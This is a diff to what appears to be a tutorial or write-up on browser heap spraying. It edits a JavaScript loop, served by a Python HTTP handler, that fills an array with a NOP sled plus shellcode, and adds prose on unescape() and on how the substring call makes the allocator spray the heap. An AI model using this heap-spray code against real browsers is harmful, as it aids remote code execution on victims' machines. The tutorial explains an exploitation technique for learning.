@@ -104,7 +104,7 @@ class HandlerClass(SimpleHTTPRequestHandler):
         nops += shellcode;
 
         for(i = 0; i < 200; i++) {
-            a[i] = i + nops;
+            a[i] = nops;
             a[i].substring(0,1); //This is only used to trick the memory allocator 
         }
     }
@@ -113,3 +113,8 @@ class HandlerClass(SimpleHTTPRequestHandler):
     .
 </script>
 ```
+The 0x90 bytes that conform the NOP sled have to be passed to the function **unescape()** to let javascript know that the string is already represented in hex. 
+
+Without the second line within the for loop, the memory allocator fails to spray the heap and only allocated one block. 
+
+3. 
